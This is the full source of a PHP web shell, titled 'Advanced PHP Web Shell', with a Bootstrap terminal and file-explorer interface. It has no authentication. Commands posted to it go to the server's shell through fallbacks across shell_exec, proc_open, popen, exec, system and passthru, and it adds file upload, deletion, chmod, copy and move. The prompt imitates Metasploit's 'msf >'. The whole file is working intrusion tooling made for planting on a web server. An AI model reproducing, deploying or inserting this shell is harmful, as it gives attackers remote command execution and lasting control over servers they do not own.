<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);
define('BASE_DIR', realpath(__DIR__));
if (!isset($_SESSION['cwd'])) { $_SESSION['cwd'] = BASE_DIR; }
if (!isset($_SESSION['cmd_history'])) { $_SESSION['cmd_history'] = []; }
function getRealDir($dir) {
    $real = realpath($dir);
    if ($real !== false && is_dir($real) && strpos($real, BASE_DIR) === 0) { return $real; }
    return false;
}
function isWithinBase($path) {
    $realBase = BASE_DIR;
    $realPath = realpath($path);
    if ($realPath === false) return false;
    return strpos($realPath, $realBase) === 0;
}
function recordCommand($cmd) { $_SESSION['cmd_history'][] = $cmd; }
function processCommand($cmd, $cwd) {
    $cmd = trim($cmd);
    recordCommand($cmd);
    $lowerCmd = strtolower($cmd);
    if ($lowerCmd === 'help') {
        $help  = "Available Commands:\n";
        $help .= "help                 - Show this help message\n";
        $help .= "sysinfo              - Display system information\n";
        $help .= "pwd                  - Show current directory\n";
        $help .= "cd [dir]             - Change directory ('..' to go up, '~' for home)\n";
        $help .= "cat [file]           - Display file contents\n";
        $help .= "mkdir [dir]          - Create a new directory\n";
        $help .= "rm [file/dir]        - Delete file or directory (recursive for dirs)\n";
        $help .= "cp [src] [dest]      - Copy file or directory\n";
        $help .= "mv [src] [dest]      - Move (rename) file or directory\n";
        $help .= "chmod [mode] [file]  - Change file permissions (octal mode)\n";
        $help .= "history              - Show command history\n";
        $help .= "search [pattern]     - Search for files in current directory\n";
        $help .= "ls, pwd, whoami, id  - Standard commands\n";
        return $help;
    }
    if ($lowerCmd === 'sysinfo') {
        $info  = php_uname('a') . "\n";
        $info .= "PHP Version: " . phpversion() . "\n";
        return $info;
    }
    if ($lowerCmd === 'pwd') { return $cwd; }
    if (substr($lowerCmd, 0, 3) === 'cd ') {
        $parts = preg_split('/\s+/', $cmd, 2);
        if (count($parts) < 2) return "Usage: cd [directory]";
        $dir = trim($parts[1]);
        if ($dir === '~') { $dir = BASE_DIR; }
        elseif ($dir === '..') { $dir = dirname($cwd); }
        else { if ($dir[0] !== '/' && $dir[0] !== '\\') { $dir = $cwd . DIRECTORY_SEPARATOR . $dir; } }
        $realDir = getRealDir($dir);
        if ($realDir === false) { return "Error: Directory not found or access denied."; }
        $_SESSION['cwd'] = $realDir;
        return "Changed directory to: " . $realDir;
    }
    if ($lowerCmd === 'history') {
        $output = "Command History:\n";
        foreach ($_SESSION['cmd_history'] as $i => $c) { $output .= ($i+1) . ". " . $c . "\n"; }
        return $output;
    }
    if (substr($lowerCmd, 0, 7) === 'search ') {
        $parts = preg_split('/\s+/', $cmd, 2);
        if (count($parts) < 2) return "Usage: search [pattern]";
        $pattern = trim($parts[1]);
        $files = glob($cwd . DIRECTORY_SEPARATOR . $pattern);
        if (!$files) { return "No matching files found."; }
        return implode("\n", array_map('basename', $files));
    }
    if (substr($lowerCmd, 0, 4) === 'cat ') {
        $parts = preg_split('/\s+/', $cmd, 2);
        if (count($parts) < 2) return "Usage: cat [filename]";
        $filename = trim($parts[1]);
        if ($filename[0] !== '/' && $filename[0] !== '\\') { $filename = $cwd . DIRECTORY_SEPARATOR . $filename; }
        if (!isWithinBase($filename)) return "Error: Access denied.";
        if (is_file($filename) && is_readable($filename)) { return file_get_contents($filename); }
        else { return "Error: File not found or not readable."; }
    }
    if (substr($lowerCmd, 0, 6) === 'mkdir ') {
        $parts = preg_split('/\s+/', $cmd, 2);
        if (count($parts) < 2) return "Usage: mkdir [directory]";
        $dirname = trim($parts[1]);
        if ($dirname[0] !== '/' && $dirname[0] !== '\\') { $dirname = $cwd . DIRECTORY_SEPARATOR . $dirname; }
        $parent = dirname($dirname);
        if (!isWithinBase($parent)) return "Error: Access denied.";
        return mkdir($dirname, 0777, true) ? "Directory created: " . $dirname : "Error: Failed to create directory.";
    }
    if (substr($lowerCmd, 0, 3) === 'rm ') {
        $parts = preg_split('/\s+/', $cmd, 2);
        if (count($parts) < 2) return "Usage: rm [file/dir]";
        $target = trim($parts[1]);
        if ($target[0] !== '/' && $target[0] !== '\\') { $target = $cwd . DIRECTORY_SEPARATOR . $target; }
        if (!isWithinBase($target)) return "Error: Access denied.";
        if (is_file($target)) { return unlink($target) ? "File deleted: " . $target : "Error: Failed to delete file."; }
        elseif (is_dir($target)) {
            if (!function_exists('rrmdir')) {
                function rrmdir($dir) {
                    $files = array_diff(scandir($dir), ['.', '..']);
                    foreach ($files as $file) { $path = $dir . DIRECTORY_SEPARATOR . $file; is_dir($path) ? rrmdir($path) : unlink($path); }
                    return rmdir($dir);
                }
            }
            return rrmdir($target) ? "Directory deleted: " . $target : "Error: Failed to delete directory.";
        } else { return "Error: Target not found."; }
    }
    if (substr($lowerCmd, 0, 3) === 'cp ') {
        $parts = preg_split('/\s+/', $cmd, 3);
        if (count($parts) < 3) return "Usage: cp [source] [destination]";
        $src = trim($parts[1]);
        $dest = trim($parts[2]);
        if ($src[0] !== '/' && $src[0] !== '\\') { $src = $cwd . DIRECTORY_SEPARATOR . $src; }
        if ($dest[0] !== '/' && $dest[0] !== '\\') { $dest = $cwd . DIRECTORY_SEPARATOR . $dest; }
        if (!isWithinBase($src) || !isWithinBase(dirname($dest))) { return "Error: Access denied."; }
        if (!file_exists($src)) return "Error: Source not found.";
        if (is_file($src)) { return copy($src, $dest) ? "File copied to: " . $dest : "Error: Failed to copy file."; }
        elseif (is_dir($src)) {
            if (!function_exists('rcopy')) {
                function rcopy($src, $dst) {
                    $dir = opendir($src);
                    @mkdir($dst);
                    while(false !== ($file = readdir($dir))) {
                        if ($file != '.' && $file != '..') {
                            is_dir($src . DIRECTORY_SEPARATOR . $file) ? rcopy($src . DIRECTORY_SEPARATOR . $file, $dst . DIRECTORY_SEPARATOR . $file)
                            : copy($src . DIRECTORY_SEPARATOR . $file, $dst . DIRECTORY_SEPARATOR . $file);
                        }
                    }
                    closedir($dir);
                }
            }
            rcopy($src, $dest);
            return "Directory copied to: " . $dest;
        }
    }
    if (substr($lowerCmd, 0, 3) === 'mv ') {
        $parts = preg_split('/\s+/', $cmd, 3);
        if (count($parts) < 3) return "Usage: mv [source] [destination]";
        $src = trim($parts[1]);
        $dest = trim($parts[2]);
        if ($src[0] !== '/' && $src[0] !== '\\') { $src = $cwd . DIRECTORY_SEPARATOR . $src; }
        if ($dest[0] !== '/' && $dest[0] !== '\\') { $dest = $cwd . DIRECTORY_SEPARATOR . $dest; }
        if (!isWithinBase($src) || !isWithinBase(dirname($dest))) { return "Error: Access denied."; }
        if (!file_exists($src)) return "Error: Source not found.";
        return rename($src, $dest) ? "Moved to: " . $dest : "Error: Failed to move.";
    }
    if (substr($lowerCmd, 0, 6) === 'chmod ') {
        $parts = preg_split('/\s+/', $cmd, 3);
        if (count($parts) < 3) return "Usage: chmod [mode] [file]";
        $mode = octdec(trim($parts[1]));
        $target = trim($parts[2]);
        if ($target[0] !== '/' && $target[0] !== '\\') { $target = $cwd . DIRECTORY_SEPARATOR . $target; }
        if (!isWithinBase($target)) return "Error: Access denied.";
        return chmod($target, $mode) ? "Permissions changed for: " . $target : "Error: Failed to change permissions.";
    }
    $fullCmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
    $output = "";
    if (function_exists('shell_exec')) {
        $output = @shell_exec($fullCmd);
        if ($output !== null && trim($output) !== "") return $output;
    }
    if (function_exists('proc_open')) {
        $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
        $process = @proc_open($fullCmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $error  = stream_get_contents($pipes[2]);
            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
            proc_close($process);
            if (trim($output . $error) !== "") return $output . $error;
        }
    }
    if (function_exists('popen')) {
        $handle = @popen($fullCmd, 'r');
        if (is_resource($handle)) {
            $output = stream_get_contents($handle);
            pclose($handle);
            if (trim($output) !== "") return $output;
        }
    }
    if (function_exists('exec')) {
        $outputArr = [];
        @exec($fullCmd, $outputArr);
        if (!empty($outputArr)) return implode("\n", $outputArr);
    }
    if (function_exists('system')) {
        ob_start();
        @system($fullCmd);
        $output = ob_get_clean();
        if ($output !== false && trim($output) !== "") return $output;
    }
    if (function_exists('passthru')) {
        ob_start();
        @passthru($fullCmd);
        $output = ob_get_clean();
        if ($output !== false && trim($output) !== "") return $output;
    }
    return "Error: No command execution functions available.";
}
function getFileList($cwd) {
    $files = scandir($cwd);
    $files = array_diff($files, ['.', '..']);
    $list = [];
    if ($cwd !== BASE_DIR) {
        $list[] = ['name' => '..', 'type' => 'dir', 'download' => ''];
    }
    foreach ($files as $file) {
        $fullPath = $cwd . DIRECTORY_SEPARATOR . $file;
        $relative = "";
        if (is_file($fullPath)) {
            $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
            $realFile = realpath($fullPath);
            if ($docRoot && strpos($realFile, $docRoot) === 0) {
                $relative = str_replace('\\', '/', substr($realFile, strlen($docRoot)));
                $relative = ($relative[0]=='/' ? $relative : '/'.$relative);
            }
        }
        $list[] = ['name' => $file, 'type' => is_dir($fullPath) ? 'dir' : 'file', 'download' => $relative];
    }
    return $list;
}
if (isset($_GET['action'])) {
    header('Content-Type: application/json');
    $action = $_GET['action'];
    if ($action == 'command') {
        $cmd = isset($_POST['command']) ? $_POST['command'] : '';
        $cwd = $_SESSION['cwd'];
        $output = processCommand($cmd, $cwd);
        echo json_encode(['output' => $output, 'cwd' => $_SESSION['cwd']]);
        exit;
    } elseif ($action == 'list') {
        $cwd = $_SESSION['cwd'];
        $list = getFileList($cwd);
        echo json_encode(['files' => $list, 'cwd' => $_SESSION['cwd']]);
        exit;
    } elseif ($action == 'upload') {
        $response = [];
        $cwd = $_SESSION['cwd'];
        if (isset($_FILES['uploadFile']) && $_FILES['uploadFile']['error'] === UPLOAD_ERR_OK) {
            $uploadName = basename($_FILES['uploadFile']['name']);
            $uploadName = preg_replace('/[^A-Za-z0-9._-]/', '_', $uploadName);
            $destination = $cwd . DIRECTORY_SEPARATOR . $uploadName;
            if (!isWithinBase($destination)) {
                $response['status'] = 'error';
                $response['message'] = 'Error: Access denied.';
            } elseif (move_uploaded_file($_FILES['uploadFile']['tmp_name'], $destination)) {
                $response['status'] = 'success';
                $response['message'] = 'File uploaded successfully.';
            } else {
                $response['status'] = 'error';
                $response['message'] = 'File upload failed.';
            }
        } else {
            $response['status'] = 'error';
            $response['message'] = 'No file uploaded or an error occurred.';
        }
        echo json_encode($response);
        exit;
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Advanced PHP Web Shell</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css">
  <style>
    body {background: #1d1f21;color: #c5c8c6;font-family: 'Fira Code', monospace;margin-bottom: 60px;}
    body.light-mode {background: #f8f9fa;color: #212529;}
    body.light-mode .navbar {background: #ffffff;border-bottom: 1px solid #dee2e6;}
    body.light-mode .navbar-brand {color: #0d6efd;}
    body.light-mode .terminal-container {background: #e9ecef;color: #212529;}
    body.light-mode .file-explorer {background: #f8f9fa;color: #212529;}
    body.light-mode .input-group-text {background: #ffffff;border: 1px solid #ced4da;color: #212529;}
    body.light-mode #commandInput {background: #ffffff;border: 1px solid #ced4da;color: #212529;}
    body.light-mode #sendCommand {background: #0d6efd;color: #ffffff;}
    body.light-mode #clearTerminal {background: #dc3545;color: #ffffff;}
    body.light-mode .footer {background: #ffffff;color: #212529;border-top: 1px solid #dee2e6;}
    .navbar {background: #282a36;border-bottom: 1px solid #444;}
    .navbar-brand {color: #8be9fd;font-size: 1.75rem;}
    .navbar .btn {background: #ff5555;color: #f8f8f2;border: none;}
    .header-banner {text-align: center;margin: 20px 0;font-size: 1rem;color: #50fa7b;}
    .terminal-container, .file-explorer {border: 1px solid #444;border-radius: 5px;padding: 15px;height: 500px;overflow-y: auto;}
    .terminal-container {background: #000;}
    .file-explorer {background: #121212;}
    .terminal-line {margin-bottom: 5px;line-height: 1.4;}
    .prompt {color: #50fa7b;}
    .command-output {color: #c5c8c6;}
    .file-item {cursor: pointer;color: #bd93f9;}
    .file-item:hover {text-decoration: underline;}
    .file-download {color: #f1fa8c;}
    .input-group-text {background: #282a36;border: 1px solid #444;color: #50fa7b;}
    #commandInput {background: #282a36;border: 1px solid #444;color: #c5c8c6;}
    #sendCommand {background: #50fa7b;border: none;color: #282a36;}
    #clearTerminal {background: #ff5555;border: none;color: #fff;}
    .fade-in {animation: fadeIn 0.4s ease-in-out;}
    @keyframes fadeIn {from {opacity: 0;} to {opacity: 1;}}
    .history-hint {font-size: 0.8rem;color: #8be9fd;margin-top: 5px;}
    .footer {position: fixed;bottom: 0;width: 100%;background: #282a36;color: #8be9fd;text-align: center;padding: 10px 0;font-size: 0.9rem;border-top: 1px solid #444;}
    .footer a {color: #50fa7b;text-decoration: none;}
    .footer a:hover {text-decoration: underline;}
  </style>
</head>
<body>
  <nav class="navbar navbar-expand-lg">
    <div class="container-fluid">
      <a class="navbar-brand" href="#">Advanced PHP Shell</a>
      <div class="d-flex">
        <button id="toggleTheme" class="btn btn-sm me-2" title="Toggle Theme"><i class="bi bi-brightness-high"></i></button>
        <button id="clearTerminal" class="btn btn-sm me-2" title="Clear Terminal"><i class="bi bi-x-circle"></i></button>
        <button id="historyBtn" class="btn btn-sm me-2" title="View Command History"><i class="bi bi-clock-history"></i></button>
        <button id="helpBtn" class="btn btn-sm" title="Help"><i class="bi bi-info-circle"></i></button>
      </div>
    </div>
  </nav>
  <div class="header-banner">Welcome! Type commands, navigate directories, upload files, and more.</div>
  <div class="container-fluid mt-3">
    <div class="row">
      <div class="col-lg-3 col-md-4 mb-3">
        <h5 class="mb-3">File Explorer</h5>
        <div id="fileExplorer" class="file-explorer"></div>
        <form id="uploadForm" class="mt-3" enctype="multipart/form-data">
          <div class="mb-2">
            <label for="uploadFile" class="form-label">Upload File</label>
            <input type="file" class="form-control form-control-sm" id="uploadFile" name="uploadFile">
          </div>
          <button type="submit" class="btn btn-primary btn-sm"><i class="bi bi-upload"></i> Upload</button>
        </form>
      </div>
      <div class="col-lg-9 col-md-8">
        <h5 class="mb-3">Terminal</h5>
        <div id="terminal" class="terminal-container"></div>
        <div class="input-group mt-3">
          <span class="input-group-text prompt" id="currentDir"><?php echo htmlspecialchars($_SESSION['cwd']); ?></span>
          <input type="text" id="commandInput" class="form-control" placeholder="msf >" autocomplete="off">
          <button class="btn" id="sendCommand"><i class="bi bi-play-fill"></i> Send</button>
        </div>
        <div class="history-hint">Use Up/Down arrow keys for command history</div>
      </div>
    </div>
  </div>
  <footer class="footer">&copy; <?php echo date("Y"); ?> Ali Essam. All rights reserved. | <a href="https://www.linkedin.com/in/dragonked2" target="_blank">Visit my LinkedIn</a> | Advanced PHP Web Shell by Ali Essam.</footer>
  <div class="modal fade" id="helpModal" tabindex="-1" aria-labelledby="helpModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-scrollable modal-lg">
      <div class="modal-content bg-dark text-light">
        <div class="modal-header">
          <h5 class="modal-title" id="helpModalLabel">Help &amp; Available Commands</h5>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          <pre>
help                 - Show this help message
sysinfo              - Display system information
pwd                  - Show current directory
cd [dir]             - Change directory ('..' to go up, '~' for home)
cat [file]           - Display file contents
mkdir [dir]          - Create a new directory
rm [file/dir]        - Delete a file or directory (recursive for dirs)
cp [src] [dest]      - Copy a file or directory
mv [src] [dest]      - Move (rename) a file or directory
chmod [mode] [file]  - Change file permissions (octal mode, e.g., 755)
history              - Show command history
search [pattern]     - Search for files in current directory (e.g., search *.php)
ls, pwd, whoami, id  - Standard commands
          </pre>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <div class="modal fade" id="historyModal" tabindex="-1" aria-labelledby="historyModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-scrollable">
      <div class="modal-content bg-dark text-light">
        <div class="modal-header">
          <h5 class="modal-title" id="historyModalLabel">Command History</h5>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          <pre id="historyContent">No history yet.</pre>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    var commandHistory = [];
    var historyIndex = -1;
    function updateFileExplorer() {
      $.getJSON("<?php echo $_SERVER['PHP_SELF']; ?>?action=list", function(data) {
        var explorer = $("#fileExplorer");
        explorer.empty();
        if (data.files && data.files.length > 0) {
          var ul = $("<ul class='list-unstyled'></ul>");
          data.files.forEach(function(item) {
            var li = $("<li></li>");
            if (item.name === '..') {
              li.append("<span class='file-item' data-type='dir' data-name='..' title='Go to Parent Directory'><i class='bi bi-folder2-open'></i> ..</span>");
            } else if (item.type === "dir") {
              li.append("<span class='file-item' data-type='dir' data-name='" + item.name + "' title='Change Directory'><i class='bi bi-folder-fill'></i> " + item.name + "</span>");
            } else {
              li.append("<a href='" + item.download + "' target='_blank' class='file-download file-item' title='Download File'><i class='bi bi-file-earmark'></i> " + item.name + "</a>");
            }
            ul.append(li);
          });
          explorer.append(ul);
        } else { explorer.html("<em>No files found.</em>"); }
      });
    }
    function updateTerminalOutput(output) {
      var term = $("#terminal");
      var line = $("<div class='terminal-line fade-in'></div>").html(output.replace(/\n/g, "<br>"));
      term.append(line);
      term.scrollTop(term[0].scrollHeight);
    }
    function updateCurrentDir(dir) { $("#currentDir").text(dir); }
    function showHistoryModal() {
      var content = "";
      if (commandHistory.length === 0) { content = "No command history."; }
      else { commandHistory.forEach(function(cmd, index) { content += (index + 1) + ". " + cmd + "\n"; }); }
      $("#historyContent").text(content);
      var historyModal = new bootstrap.Modal(document.getElementById('historyModal'));
      historyModal.show();
    }
    $(document).ready(function(){
      updateTerminalOutput("<span class='command-output'>Welcome to Advanced PHP Web Shell (Beta). Type 'help' for available commands.</span>");
      updateFileExplorer();
      $("#toggleTheme").click(function(){ $("body").toggleClass("light-mode"); });
      $("#sendCommand").click(function(){
        var command = $("#commandInput").val();
        if (command.trim() === "") return;
        updateTerminalOutput("<span class='prompt'>" + $("#currentDir").text() + " msf > </span>" + command);
        commandHistory.push(command);
        historyIndex = commandHistory.length;
        var originalHTML = $("#sendCommand").html();
        $("#sendCommand").html('<span class="spinner-border spinner-border-sm"></span>');
        $("#sendCommand").prop("disabled", true);
        $.post("<?php echo $_SERVER['PHP_SELF']; ?>?action=command", { command: command }, function(data){
          updateTerminalOutput(data.output);
          updateCurrentDir(data.cwd);
          updateFileExplorer();
        }, "json").always(function(){
          $("#sendCommand").html(originalHTML);
          $("#sendCommand").prop("disabled", false);
        });
        $("#commandInput").val("").focus();
      });
      $("#commandInput").keydown(function(e){
        if(e.keyCode === 38) {
          if(historyIndex > 0) { historyIndex--; $("#commandInput").val(commandHistory[historyIndex]); }
          e.preventDefault();
        } else if(e.keyCode === 40) {
          if(historyIndex < commandHistory.length - 1) { historyIndex++; $("#commandInput").val(commandHistory[historyIndex]); }
          else { $("#commandInput").val(""); historyIndex = commandHistory.length; }
          e.preventDefault();
        }
      });
      $("#commandInput").keypress(function(e){ if(e.which == 13) { $("#sendCommand").click(); } });
      $("#clearTerminal").click(function(){ $("#terminal").empty(); });
      $("#historyBtn").click(function(){ showHistoryModal(); });
      $("#helpBtn").click(function(){
        var helpModal = new bootstrap.Modal(document.getElementById('helpModal'));
        helpModal.show();
      });
      $("#fileExplorer").on("click", ".file-item", function(){
        var type = $(this).data("type");
        var name = $(this).data("name");
        if (type === "dir") {
          $.post("<?php echo $_SERVER['PHP_SELF']; ?>?action=command", { command: "cd " + name }, function(data){
            updateTerminalOutput(data.output);
            updateCurrentDir(data.cwd);
            updateFileExplorer();
          }, "json");
        }
      });
      $("#uploadForm").submit(function(e){
        e.preventDefault();
        var formData = new FormData(this);
        $.ajax({
          url: "<?php echo $_SERVER['PHP_SELF']; ?>?action=upload",
          type: "POST",
          data: formData,
          processData: false,
          contentType: false,
          dataType: "json",
          success: function(data) { updateTerminalOutput(data.message); updateFileExplorer(); },
          error: function() { updateTerminalOutput("File upload error."); }
        });
      });
    });
  </script>
</body>
</html>
